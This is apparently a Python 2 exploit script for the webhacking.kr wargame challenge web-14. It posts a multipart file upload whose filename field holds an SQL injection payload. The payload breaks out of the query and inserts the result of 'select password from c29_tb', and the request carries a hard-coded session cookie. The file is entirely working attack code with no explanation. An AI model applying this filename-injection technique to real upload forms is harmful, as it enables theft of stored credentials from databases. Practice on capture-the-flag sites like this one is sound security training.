import urllib
import httplib
import hashlib

file_name="zpd',(select password from c29_tb),0x3131362E34342E3138382E3438)#"

HTTP=httplib.HTTPConnection("webhacking.kr")
Param='------WebKitFormBoundarytkBj9DQQafJrSHIB\r\n'
Param+='Content-Disposition: form-data; name="upfile"; filename="'+file_name+'"\r\n'
Param+='Content-Type: text/plain\r\n'
Param+='\r\n'
Param+='\r\n'
Param+='------WebKitFormBoundarytkBj9DQQafJrSHIB--'
Headers={"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundarytkBj9DQQafJrSHIB",
         "Cookie":"PHPSESSID=af805d0d3306b50b45f162fc422f2545;",
         "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"}
HTTP.request("POST","/challenge/web/web-14/index.php",Param,Headers)
Result=HTTP.getresponse().read()
print Result
